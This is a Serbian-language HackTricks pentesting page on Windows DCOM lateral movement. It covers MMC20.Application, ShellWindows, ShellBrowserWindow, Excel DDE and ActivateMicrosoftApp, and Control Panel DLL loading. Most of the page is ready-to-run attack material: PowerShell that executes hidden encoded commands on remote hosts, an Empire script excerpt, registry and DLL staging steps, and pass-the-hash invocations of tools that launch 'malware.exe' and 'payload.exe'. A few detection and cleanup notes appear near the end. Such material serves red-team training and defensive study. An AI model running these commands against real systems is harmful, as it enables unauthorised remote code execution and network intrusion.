# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement je privlačan jer ponovo koristi postojeće COM servere izložene preko RPC/DCOM-a, umesto kreiranja servisa ili scheduled task-a. U praksi to znači da početna konekcija obično počinje preko TCP/135, a zatim prelazi na dinamički dodeljene visoke RPC portove.

## Prerequisites & Gotchas

- Obično vam je potreban kontekst lokalnog administratora na targetu, a udaljeni COM server mora dozvoliti remote launch/activation.
- Od **14. marta 2023.**, Microsoft primenjuje DCOM hardening na podržanim sistemima. Stari klijenti koji zahtevaju nizak nivo authentication-a za activation mogu doživeti neuspeh osim ako ne pregovaraju najmanje `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Moderni Windows klijenti se obično automatski podižu na odgovarajući nivo, tako da aktuelni alati uglavnom nastavljaju da rade.<sup>[[3]](#references)</sup>
- Ručno ili skriptovano DCOM izvršavanje uglavnom zahteva TCP/135 i targetov dinamički opseg RPC portova. Ako koristite Impacket-ov `dcomexec.py` i želite da dobijete izlaz komande, obično vam je potreban i SMB pristup ka `ADMIN$` (ili drugom share-u sa mogućnošću čitanja/upisivanja).
- Ako RPC/DCOM funkcioniše, ali je SMB blokiran, `dcomexec.py -nooutput` i dalje može biti koristan za blind execution.

Brze provere:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Za više informacija o ovoj tehnici pogledajte [originalni post o MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objekti pružaju zanimljivu mogućnost za interakciju sa objektima zasnovanu na mreži. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Component Object Model (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Lista DCOM aplikacija može se dobiti pomoću PowerShell komande:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava skriptovanje operacija MMC snap-inova. Značajno je da ovaj objekat sadrži metod `ExecuteShellCommand` u okviru `Document.ActiveView`. Više informacija o ovom metodu možete pronaći [ovde](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Proverite ga pokretanjem:<sup>[[6]](#references)</sup>

Ova funkcija omogućava izvršavanje komandi preko mreže kroz DCOM aplikaciju. Za interakciju sa DCOM-om na daljinu kao admin, PowerShell se može koristiti na sledeći način:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ova komanda se povezuje sa DCOM aplikacijom i vraća instancu COM objekta. Zatim se može pozvati metoda ExecuteShellCommand za izvršavanje procesa na remote hostu. Proces obuhvata sledeće korake:

Proverite metode:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Ostvarivanje RCE-a:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Poslednji argument predstavlja stil prozora. `7` održava prozor minimizovanim. Operativno, izvršavanje zasnovano na MMC-u obično dovodi do toga da udaljeni proces `mmc.exe` pokrene vaš payload, što se razlikuje od objekata zasnovanih na Explorer-u navedenih u nastavku.

## ShellWindows & ShellBrowserWindow

**Za više informacija o ovoj tehnici pogledajte originalnu objavu [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Utvrđeno je da objekat **MMC20.Application** nema eksplicitne „LaunchPermissions“, već podrazumevano koristi permissions koje Administratorima omogućavaju pristup. Za više detalja, nit se može pogledati [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje alata OleView .NET autora [@tiraniddo](https://twitter.com/tiraniddo) za filtriranje objekata bez eksplicitne Launch Permission.

Dva konkretna objekta, `ShellBrowserWindow` i `ShellWindows`, izdvojena su zbog nedostatka eksplicitnih Launch Permissions. Nepostojanje `LaunchPermission` registry unosa pod `HKCR:\AppID\{guid}` označava da ne postoje eksplicitne permissions.

U poređenju sa objektom `MMC20.Application`, ovi objekti su često tiši iz OPSEC perspektive, jer komanda na udaljenom hostu obično završi kao child proces od `explorer.exe`, umesto od `mmc.exe`.

### ShellWindows

Za `ShellWindows`, koji nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` omogućavaju instanciranje objekta korišćenjem njegovog AppID-ja. Ovaj proces koristi OleView .NET za pronalaženje CLSID-ja objekta `ShellWindows`. Nakon instanciranja, interakcija je moguća putem metode `WindowsShell.Item`, što dovodi do pozivanja metode poput `Document.Application.ShellExecute`.

Dati su primeri PowerShell komandi za instanciranje objekta i udaljeno izvršavanje komandi:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` je sličan, ali ga možete direktno instancirati putem njegovog CLSID-a i pivotovati na `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement sa Excel DCOM objektima

Lateral movement se može ostvariti iskorišćavanjem Excel DCOM objekata. Za detaljne informacije preporučuje se da pročitate diskusiju o korišćenju Excel DDE-a za lateral movement putem DCOM-a na [Cybereason blogu](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Empire projekat obezbeđuje PowerShell skriptu koja demonstrira korišćenje Excela za daljinsko izvršavanje koda (RCE) manipulisanjem DCOM objektima. U nastavku se nalaze isečci iz skripte dostupne u [Empire GitHub repozitorijumu](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), koji prikazuju različite metode za zloupotrebu Excela radi RCE-a:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Nedavno istraživanje proširilo je ovu oblast metodom `ActivateMicrosoftApp()` objekta `Excel.Application`. Ključna ideja je da Excel može pokušati da pokrene legacy Microsoft aplikacije kao što su FoxPro, Schedule Plus ili Project pretraživanjem sistemskog `PATH`-a. Ako operator može da postavi payload sa jednim od očekivanih naziva u lokaciju sa mogućnošću upisivanja koja je deo `PATH`-a ciljnog sistema, Excel će ga izvršiti.<sup>[[4]](#references)</sup>

Zahtevi za ovu varijaciju:

- Local admin na ciljnom sistemu
- Excel instaliran na ciljnom sistemu
- Mogućnost upisivanja payload-a u direktorijum sa mogućnošću upisivanja koji se nalazi u `PATH`-u ciljnog sistema

Praktičan primer zloupotrebe FoxPro lookup-a (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Ako napadački host nema registrovan lokalni `Excel.Application` ProgID, instancirajte udaljeni objekat pomoću CLSID-a:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Vrednosti za koje je u praksi uočena zloupotreba:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — učitavanje registrovanog Control Panel DLL-a

Klasa `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) izlaže `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Njena metoda `Open()` uzrokuje da udaljeni `dllhost.exe` učita Control Panel DLL-ove registrovane pod ključem `Control Panel\Cpls`. Klasa na testiranim sistemima nema eksplicitne dozvole za pokretanje/pristup, pa nasleđuje podrazumevanu DCOM politiku (koja obično zahteva administratora za udaljenu aktivaciju). Nasumično ime stavke dovoljno je da metoda `Open()` obradi registrovane DLL-ove; payload ne mora imati ekstenziju `.cpl`, ali mora biti važeći DLL odgovarajuće arhitekture.<sup>[[7]](#references)</sup>

Ovaj primitive je **stage-and-trigger**, a ne izvršavanje samo komande: prvo kopirajte DLL na cilj i kreirajte vrednost `REG_EXPAND_SZ` koja pokazuje na njega, a zatim aktivirajte objekat preko DCOM-a. Na primer, iz administrativnog Windows konteksta:<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
Javni [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) klijent implementira nedokumentovani DCOM poziv koristeći Impacket. Navođenje proizvoljnog naziva stavke Control Panel-a je dovoljno; klijent može prijaviti RPC grešku iako je `dllhost.exe` učitao DLL.<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
Operativno, ovaj put takođe zahteva kanal za upis datoteka i udaljeni pristup registru, pa je bučniji od `MMC20`/`ShellWindows`. Stvara sporedni efekat persistence-a jer kasnije otvaranje Control Panel-a može ponovo učitati isti unos. Uklonite vrednost nakon izvršavanja i tražite neočekivane vrednosti u `Control Panel\Cpls`, zajedno sa neuobičajenim učitavanjima DLL-ova u `dllhost.exe`.<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Alati za automatizaciju lateralnog kretanja

Dva alata su istaknuta za automatizaciju ovih tehnika:

- **Invoke-DCOM.ps1**: PowerShell skripta koju obezbeđuje projekat Empire i koja pojednostavljuje pozivanje različitih metoda za izvršavanje koda na udaljenim računarima. Ova skripta je dostupna u Empire GitHub repozitorijumu.

- **SharpLateral**: Alat namenjen udaljenom izvršavanju koda, koji se može koristiti sledećom komandom:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatski alati

- Powershell skripta [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) omogućava jednostavno pozivanje svih komentarisanim načinima opisanih načina za izvršavanje koda na drugim mašinama.
- Možete koristiti Impacket-ov `dcomexec.py` za izvršavanje komandi na udaljenim sistemima pomoću DCOM-a. Trenutne verzije podržavaju `ShellWindows`, `ShellBrowserWindow` i `MMC20`, a podrazumevano koriste `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Takođe možete koristiti [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Takođe možete koristiti [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Lateral Movement korišćenjem MMC20.Application COM objekta](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement putem DCOM-a: drugi krug](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Upravljanje promenama za Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Zloupotreba mogućnosti DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Korišćenje Excel DDE za lateral movement putem DCOM-a](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Korišćenje DCOM objekata za udaljeno izvršavanje komandi](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
